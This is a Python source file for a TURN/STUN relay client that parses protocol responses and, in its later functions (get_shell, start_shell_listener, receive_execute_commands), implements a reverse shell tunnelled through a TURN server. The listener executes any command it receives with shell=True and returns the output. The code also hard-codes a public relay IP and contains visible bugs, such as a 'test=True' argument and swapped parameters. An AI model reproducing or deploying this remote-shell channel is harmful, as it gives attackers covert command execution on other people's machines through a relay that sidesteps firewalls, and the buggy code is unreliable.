import asyncio
import random
import socket
import struct
import time
import packetBuilder
import subprocess

## MESSAGE TYPES
STUN_MESSAGE_TYPES = {
    0x0001: "Binding Request",
    0x0101: "Binding Success Response",
    0x0111: "Binding Error Response",
    
    0x0003: "Allocate Request",
    0x0103: "Allocate Success Response",
    0x0113: "Allocate Error Response",

    0x0004: "Refresh Request",
    0x0104: "Refresh Success Response",
    0x0114: "Refresh Error Response",

    0x0006: "Send Indication",  
    0x0017: "Data Indication",

    0x0008: "CreatePermission Request",
    0x0108: "CreatePermission Success Response",
    0x0118: "CreatePermission Error Response",

    0x0009: "ChannelBind Request",
    0x0109: "ChannelBind Success Response",
    0x0119: "ChannelBind Error Response",
}

# TEST CLIENT for demo
## Start client ##
async def start_client(ip, port):
    turn_server = ip             # TURN server's IP
    turn_port = int(port)        # Default TURN port most likely
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    alloc_packet = packetBuilder.build_alloc()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)

    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)

        # Receive the response from the TURN server
        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")    

    ## Maintain connection with refresh packets
    asyncio.create_task(send_refresh(sock, TURN_SERVER))

## Start client ##
async def start_send_client(ip, port):
    turn_server = ip             # TURN server's IP
    turn_port = int(port)        # Default TURN port most likely
    peer_ip = input("IP of Peer: ")
    peer_port = int(input("Port of peer: "))
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    alloc_packet = packetBuilder.build_alloc()
    create_perm_packet = packetBuilder.build_createPerm(peer_ip, peer_port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
    
    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)
            
        # Send the Create Perm packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(create_perm_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")    
            
    ## Maintain connection with refresh packets
    asyncio.create_task(send_refresh(sock, TURN_SERVER))
    
    ## Add peer ip and port to configuration setup
    ## Figure out how to test with another client on VM
    ## Need to build data indication so that client can receive "Hello, World!"
    # perm = build_createPerm("127.0.0.1", 1234)
    # sock.sendto(perm, TURN_SERVER)
    
    
    while True:
        payload = input("Send a message(q to quit): ")
        if(payload == "q"):
            break
        send = packetBuilder.build_send_indication(peer_ip, peer_port, payload)
        sock.sendto(send, TURN_SERVER) 


        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)
        # kill = build_kill_refresh()
        # sock.sendto(kill, TURN_SERVER)
        
## LISTENER CLIENT - GET FILE ???
async def start_listener_client(ip, port):
    turn_server = ip             # TURN server's IP
    turn_port = int(port)        # Default TURN port most likely
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    
    alloc_packet = packetBuilder.build_alloc()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
    sock.bind(('0.0.0.0', int(port)))
    
    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")  
       
    ## Wait for responses from the turn server
    asyncio.create_task(receive_response(sock))
    
    ## Maintain connection with refresh packets
    asyncio.create_task(send_refresh(sock, TURN_SERVER))
    
## Start Remote Connection ##
async def get_shell(ip ,port):
    turn_server = ip             # TURN server's IP
    turn_port = int(port)        # Default TURN port most likely
    peer_ip = input("IP of Peer: ")
    peer_port = int(input("Port of peer: "))
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    alloc_packet = packetBuilder.build_alloc()
    create_perm_packet = packetBuilder.build_createPerm(peer_ip, peer_port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
    
    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)
            
        # Send the Create Perm packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(create_perm_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")    
            
    ## Maintain connection with refresh packets
    asyncio.create_task(send_refresh(sock, TURN_SERVER))
    
    ## Begin Getting shell
    # Channel number must be between those values (in RFC)
    channel_number = random.randint(0x4000, 0x7FFF)
    print(f"CHANNEL NUMBER: {channel_number}")
    channel_bind_packet = packetBuilder.build_channelBind(peer_ip, peer_port, channel_number)
    sock.sendto(channel_bind_packet, TURN_SERVER)
    
    response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
    print(f"Received response from {addr}")

    if response:
        print("Response (hex):", response.hex())
        read_server_response(response)
        
    ## Receive shell response
    asyncio.create_task(receive_shell_response(sock))
    
    ## SEND COMMANDS LOOP
    while True:
        command = input("Send a command(q to quit): ")
        
        if(command == "q"):
            break
        send = packetBuilder.build_channelData(channel_number, command.strip())
        sock.sendto(send, TURN_SERVER) 
    
## Receive Shell Response from Peer
async def receive_shell_response(sock):
    while True:
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")

        if response:
            print(f"\n[Response from Peer]: {response.decode('utf-8')}\n")
        
        await asyncio.sleep(0.1)
    
## PEER REVERSE SHELL ##
async def start_shell_listener(ip, port, channel_number):
    turn_server = ip             # TURN server's IP
    turn_port = int(port)        # Default TURN port most likely
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    client_ip = input("IP of Client: ")
    client_port = int(input("Port of Client: "))
    alloc_packet = packetBuilder.build_alloc()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
    sock.bind(('0.0.0.0', int(port)))
    
    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)
        
        # Receive the response from the TURN server
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received response from {addr}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")  
    
    ## Maintain connection with refresh packets
    asyncio.create_task(send_refresh(sock, TURN_SERVER))
    
    # Channel bind
    channel_bind_packet = packetBuilder.build_channelBind(client_ip, client_port, channel_number)
    sock.sendto(channel_bind_packet, TURN_SERVER)
    
    ## LISTEN FOR COMMANDS AND SEND RESULTS BACK
    asyncio.create_task(receive_execute_commands(sock, TURN_SERVER, channel_number))
    
async def receive_execute_commands(sock, TURN_SERVER, channel_number):
    while True:
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received command from {addr} at {time.strftime('%H:%M:%S')}")

        command = response.decode('utf-8').strip()
        
        if command.lower() == "exit":
            print("Exiting listener...")
            break
        
        result = subprocess.run(command, shell=True, capture_output=True, test=True)
        output = result.stdout if result.stdout else result.stderr
        output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
        
        ## Send output back
        send_data_packet = packetBuilder.build_channelData(output, channel_number)
        sock.sendto(send_data_packet, TURN_SERVER)
        print(f"Sent command output back to client.")
        
        await asyncio.sleep(0.1)
            
async def receive_response(sock):
    while True:
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")

        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)
        
        await asyncio.sleep(0.1)
    
## Human Readable Server Responses ##
def read_server_response(response):    
    msg_type, msg_length, magic_cookie, transaction_id = struct.unpack_from("!HHI12s", response, 0)
    print(f"MSG_TYPE: {STUN_MESSAGE_TYPES.get(msg_type)}")
    print(f"MSG_LENGTH: {msg_length}")
    print(f"MAGIC_COOKIE: {hex(magic_cookie)}")
    print(f"TRANSACTION_ID: {transaction_id.hex()}")
    
    offset = 20  # Start of attributes

    # Parse Attributes
    while offset < len(response):
        MAGIC_COOKIE = 0x2112A442
        attr_type, attr_length = struct.unpack_from("!HH", response, offset)
        offset += 4  # Move past type and length

        attr_value = response[offset : offset + attr_length]
        offset += attr_length  # Move past value

        match attr_type:
            case 0x000D: # LIFETIME
                lifetime = struct.unpack("!I", attr_value)[0]
                print(f"Lifetime\n\tValue: {lifetime} seconds")
            case 0x0020: # XOR-MAPPED-ADDRESS
                family, xor_port = struct.unpack("!HH", attr_value[:4])
                #MAGIC COOKIE
                xor_ip = struct.unpack("!I", attr_value[4:])[0] ^ MAGIC_COOKIE
                ip_addr = ".".join(map(str, xor_ip.to_bytes(4, 'big')))
                port = xor_port ^ 0x2112
                print(f"XOR-MAPPED-ADDRESS\n\tIP: {ip_addr}\n\tPORT: {port}")
            case 0x0008: # RESERVED ADDRESS (another XOR-MAPPED-ADDRESS)
                family, xor_port = struct.unpack("!HH", attr_value[:4])
                xor_ip = struct.unpack("!I", attr_value[4:])[0] ^ MAGIC_COOKIE
                ip_addr = ".".join(map(str, xor_ip.to_bytes(4, 'big')))
                port = xor_port ^ 0x2112
                print(f"Reserved XOR-MAPPED-ADDRESS\n\tIP: {ip_addr}\n\tPORT: {port}")
            case 0x8022: # SOFTWARE
                software_version = attr_value.decode(errors="ignore")
                print(f"Software\n\tValue: {software_version}")
            case 0x8028: # FINGERPRINT
                fingerprint = struct.unpack("!I", attr_value)[0]
                print(f"Fingerprint\n\tValue: {fingerprint}")
            case 0x0013: # DATA
                data = attr_value
                print(f"🔹 DATA (Received from peer):\n\t{data.hex()}") 
                print(f"\tDecoded: {data.decode()}")
            case 0x0012: # XOR-PEER-ADDRESS (PEER)
                family, xor_port = struct.unpack("!HH", attr_value[:4])
                xor_ip = struct.unpack("!I", attr_value[4:])[0] ^ 0x2112A442
                peer_ip = ".".join(map(str, xor_ip.to_bytes(4, 'big')))
                peer_port = xor_port ^ 0x2112
                print(f"🔹 XOR-PEER-ADDRESS\n\tIP: {peer_ip}\n\tPORT: {peer_port}")

##Send refresh async
async def send_refresh(sock, TURN_SERVER):
   while True:
        refresh = packetBuilder.build_refresh()
        sock.sendto(refresh, TURN_SERVER)
        print(f"Sent Refresh packet at {time.strftime('%H:%M:%S')}")
        
        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
        print(f"Received response from {addr}")
        if response:
            print("Response (hex):", response.hex())
            read_server_response(response)
        
        await asyncio.sleep(10) # Wait 300 seconds before sending again
        
if __name__ == "__main__":
    turn_server = "54.234.196.215"             # TURN server's IP
    turn_port = int(3478)        # Default TURN port most likely
    TURN_SERVER = tuple([turn_server, int(turn_port)])
    alloc_packet = packetBuilder.build_alloc()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(None)  # Set a timeout for the response (5 seconds)

    try:
        # Send the Allocate packet to the TURN server
        print(f"Sending packet to {turn_server}:{turn_port}")
        sock.sendto(alloc_packet, TURN_SERVER)

        # Receive the response from the TURN server
        # response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
        # print(f"Received response from {addr}")

        # if response:
        #     print("Response (hex):", response.hex())
        #     read_server_response(response)

    except socket.timeout:
        print("No response received (timeout).")
    except Exception as e:
       print(f"Error: {e}")  